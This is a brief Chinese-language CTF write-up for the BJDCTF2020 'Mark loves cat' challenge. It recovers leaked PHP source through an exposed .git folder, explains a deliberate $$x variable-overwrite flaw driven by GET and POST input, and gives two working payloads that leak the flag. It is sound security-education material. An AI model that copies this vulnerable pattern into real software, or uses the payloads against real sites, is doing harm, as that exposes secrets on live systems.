题目

[BJDCTF2020]Mark loves cat

分析

一个看上去很正常的网页，没发现什么点—–扫目录吧
看到.git泄露
githack
下来的只有一个assets文件夹，看别人的WP是有index.php的？？？？？？？ 

<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;

变量覆盖
GET和POST flag才会执行最后的输出，可是这样就吧$flag给覆盖了

可以将$yds覆盖成$flag借助$$x = $$y;

解

payload1：GET ?yds=flag

payload2:GET ?is=flag&flag=flag
